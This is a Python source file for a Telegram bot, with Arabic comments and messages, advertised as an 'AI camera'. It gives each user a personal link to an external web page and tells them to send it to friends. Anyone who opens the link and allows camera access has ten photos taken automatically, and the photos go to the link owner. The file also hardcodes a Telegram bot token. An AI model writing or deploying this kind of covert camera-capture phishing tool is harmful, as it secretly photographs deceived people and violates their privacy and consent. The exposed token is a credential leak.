import telebot
import time
import logging
from datetime import datetime
from requests.exceptions import ReadTimeout, ConnectionError
from flask import Flask, request, jsonify
from threading import Thread
import os

# ---------------------------------------------
# 1. إعدادات السيرفر الوهمي (لإبقاء البوت يعمل على Render)
# ---------------------------------------------
app = Flask(__name__)

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>كاميرا الذكاء الاصطناعي</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
                color: white;
                text-align: center;
                padding: 50px;
            }
            .container {
                background: rgba(255,255,255,0.1);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 15px;
                max-width: 600px;
                margin: 0 auto;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            }
            h1 {
                color: #4fc3f7;
            }
            .status {
                background: #2e7d32;
                padding: 10px;
                border-radius: 5px;
                margin: 20px 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🤖 بوت كاميرا الذكاء الاصطناعي</h1>
            <div class="status">✅ البوت يعمل بنجاح</div>
            <p>تم تشغيل البوت في: <strong>""" + str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + """</strong></p>
            <p>عدد المستخدمين المسجلين: <strong>""" + str(len(user_stats)) + """</strong></p>
            <p>إجمالي الصور المستلمة: <strong>""" + str(total_photos_received) + """</strong></p>
            <hr>
            <p>استخدم الأمر /start في تلجرام للحصول على رابطك الشخصي</p>
        </div>
    </body>
    </html>
    """

@app.route('/webhook', methods=['POST'])
def webhook():
    """للتكامل مع خدمات خارجية إذا لزم الأمر"""
    data = request.json
    return jsonify({"status": "ok", "message": "Webhook received"})

def run():
    # بورت 8080 هو البورت القياسي الذي ينتظره Render
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# ---------------------------------------------
# 2. إعدادات بوت تيليجرام
# ---------------------------------------------
TOKEN = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg'
bot = telebot.TeleBot(TOKEN)

# رابط GitHub Pages الخاص بك (صفحة الكاميرا)
BASE_URL = "https://khldwnnsraljrady-collab.github.io/whatsapp-bot-v1/" 

# إعدادات التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# إحصائيات
user_stats = {}  # {user_id: {"name": str, "photo_count": int, "first_seen": datetime}}
total_photos_received = 0

# ---------------------------------------------
# 3. معالجة الأوامر
# ---------------------------------------------

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name
    
    # تسجيل المستخدم في الإحصائيات
    if user_id not in user_stats:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 0,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    else:
        user_stats[user_id]["last_active"] = datetime.now()
    
    # دمج رابط الموقع مع ايدي المستخدم
    personal_link = f"{BASE_URL}?id={user_id}"
    
    # إنشاء كيبورد (لوحة مفاتيح) تفاعلية
    markup = telebot.types.InlineKeyboardMarkup()
    
    # زر لفتح الكاميرا مباشرة
    camera_btn = telebot.types.InlineKeyboardButton(
        text="📸 افتح الكاميرا الآن", 
        url=personal_link
    )
    
    # زر للحصول على التعليمات
    help_btn = telebot.types.InlineKeyboardButton(
        text="❓ التعليمات", 
        callback_data="help"
    )
    
    # زر للإحصائيات
    stats_btn = telebot.types.InlineKeyboardButton(
        text="📊 إحصائياتي", 
        callback_data="stats"
    )
    
    markup.add(camera_btn)
    markup.add(help_btn, stats_btn)
    
    response = (
        f"🎉 أهلاً بك *{user_name}*!\n\n"
        f"✨ هذا هو *رابطك الشخصي* للكاميرا الذكية:\n"
        f"`{personal_link}`\n\n"
        f"📌 *طريقة الاستخدام:*\n"
        f"1. انسخ الرابط أعلاه\n"
        f"2. أرسله لأصدقائك\n"
        f"3. أي شخص يفتح الرابط ويعمل اذن الوصول الى الكاميرا ستصل صورته إليك فوراً!\n\n"
        f"🔒"
        f" *ملاحظة:*ملاحظة الصورة التي ستصلك لن تصل الى اي احد غيرك لن يقدر اي شخص مشاهدته"
    )
    
    bot.send_message(user_id, response, 
                    parse_mode="Markdown",
                    reply_markup=markup)
    
    logger.info(f"New user started: {user_name} (ID: {user_id})")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name
    
    if user_id in user_stats:
        user_stat = user_stats[user_id]
        response = (
            f"📊 *إحصائياتك الشخصية*\n\n"
            f"👤 الاسم: {user_stat['name']}\n"
            f"🆔 رقمك: {user_id}\n"
            f"📸 عدد الصور المستلمة: {user_stat['photo_count']}\n"
            f"📅 تاريخ التسجيل: {user_stat['first_seen'].strftime('%Y-%m-%d')}\n"
            f"🕐 آخر نشاط: {user_stat['last_active'].strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🌐 *إحصائيات عامة:*\n"
            f"👥 عدد المستخدمين: {len(user_stats)}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}"
        )
    else:
        response = "❌ لم يتم العثور على إحصائيات لك. استخدم /start أولاً"
    
    bot.send_message(user_id, response, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "📖 *دليل استخدام البوت*\n\n"
        "🎯 *الأوامر المتاحة:*\n"
        "✅ /start - الحصول على رابطك الشخصي\n"
        "📊 /stats - عرض إحصائياتك\n"
        "❓ /help - عرض هذه التعليمات\n\n"
        "🔧 *كيف يعمل البوت:*\n"
        "1. اضغط على /start للحصول على رابطك الشخصي\n"
        "2. أرسل الرابط لأصدقائك\n"
        "3. عندما يفتحون الرابط، سيتم تحميل كاميرا الويب\n"
        "4. يتم التقاط 10 صور تلقائياً (صورة كل 5 ثواني)\n"
        "5. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
        "⚠️ *ملاحظات هامة:*\n"
        "• البوت يأخذ 10 صور فقط ثم يتوقف\n"
        "• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
        "• الصور تصل فقط لصاحب الرابط\n"
        "• لا يتم حفظ الصور في أي سيرفر\n\n"
        "🛠️ للمساعدة التقنية: @khaled_developer"
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    """للبث لجميع المستخدمين (للمطور فقط)"""
    user_id = message.chat.id
    
    # التحقق إذا كان المستخدم هو المطور (يمكن تعديل ID)
    DEVELOPER_ID = 6002805119  # ضع رقمك هنا
    
    if user_id != DEVELOPER_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return
    
    # استخراج الرسالة من الأمر
    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ صيغة خاطئة. استخدم:\n/broadcast نص الرسالة")
        return
    
    broadcast_text = command_parts[1]
    
    # إعداد زر للموقع
    markup = telebot.types.InlineKeyboardMarkup()
    site_btn = telebot.types.InlineKeyboardButton(
        text="🌐 زيارة الموقع", 
        url=BASE_URL
    )
    markup.add(site_btn)
    
    # البث لجميع المستخدمين
    success_count = 0
    fail_count = 0
    
    for uid in user_stats.keys():
        try:
            bot.send_message(uid, 
                           f"📢 *إشعار من المطور:*\n\n{broadcast_text}", 
                           parse_mode="Markdown",
                           reply_markup=markup)
            success_count += 1
            time.sleep(0.1)  # لتجنب حظر تلجرام
        except Exception as e:
            logger.error(f"Failed to send to {uid}: {e}")
            fail_count += 1
    
    bot.reply_to(message, 
                f"✅ تم البث بنجاح!\n\n"
                f"✓ تم الإرسال لـ: {success_count} مستخدم\n"
                f"✗ فشل الإرسال لـ: {fail_count} مستخدم")

# ---------------------------------------------
# 4. معالجة الصور الواردة
# ---------------------------------------------

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    global total_photos_received
    
    user_id = message.chat.id
    user_name = message.from_user.first_name if message.from_user else "مجهول"
    
    # تحديث إحصائيات المستخدم
    if user_id in user_stats:
        user_stats[user_id]["photo_count"] += 1
        user_stats[user_id]["last_active"] = datetime.now()
    else:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 1,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    
    total_photos_received += 1
    
    # استخراج أفضل جودة للصورة
    photo = message.photo[-1]
    file_id = photo.file_id
    
    # الحصول على معلومات الملف
    file_info = bot.get_file(file_id)
    file_size = file_info.file_size / 1024  # حجم بالكيلوبايت
    
    # إرسال تأكيد استلام
    caption = (
        f"✅ تم استلام صورة جديدة!\n\n"
        f"👤 من: {user_name}\n"
        f"🆔 الرقم: {user_id}\n"
        f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
        f"📊 الإجمالي الكلي: {total_photos_received}"
    )
    
    # إرسال الصورة مع التسمية التوضيحية
    bot.reply_to(message, caption)
    
    logger.info(f"Received photo from {user_name} (ID: {user_id}) - Size: {file_size:.1f}KB")

# ---------------------------------------------
# 5. معالجة Callback Queries (الزر التفاعلي)
# ---------------------------------------------

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    
    if call.data == "help":
        send_help(call.message)
        bot.answer_callback_query(call.id, "📖 عرض التعليمات")
    
    elif call.data == "stats":
        show_stats(call.message)
        bot.answer_callback_query(call.id, "📊 عرض الإحصائيات")

# ---------------------------------------------
# 6. معالجة الرسائل النصية العادية
# ---------------------------------------------

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if message.text.startswith('/'):
        # إذا كان أمر غير معروف
        bot.reply_to(message, 
                    "❌ أمر غير معروف!\n\n"
                    "✅ الأوامر المتاحة:\n"
                    "/start - للحصول على رابطك\n"
                    "/stats - لعرض إحصائياتك\n"
                    "/help - للتعليمات والمساعدة")
    else:
        # معالجة الرسائل النصية العادية
        welcome_text = (
            f"مرحباً {message.from_user.first_name}! 👋\n\n"
            f"يمكنك استخدام الأوامر التالية:\n"
            f"• /start - للحصول على رابطك الشخصي\n"
            f"• /stats - لعرض إحصائياتك\n"
            f"• /help - للتعليمات\n\n"
            f"أو أرسل صورة وسأقوم بحفظها لك! 📸"
        )
        bot.reply_to(message, welcome_text)

# ---------------------------------------------
# 7. تشغيل البوت والسيرفر معاً
# ---------------------------------------------

# تشغيل السيرفر في الخلفية
keep_alive()

print("=" * 50)
print("🤖 بوت كاميرا الذكاء الاصطناعي")
print(f"⏰ تم التشغيل في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("=" * 50)

# حلقة التشغيل اللانهائية (لمنع التوقف عند الأخطاء البسيطة)
while True:
    try:
        logger.info("Starting bot polling...")
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except (ReadTimeout, ConnectionError) as e:
        logger.warning(f"Connection error: {e}. Retrying in 5 seconds...")
        time.sleep(5)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        time.sleep(10)
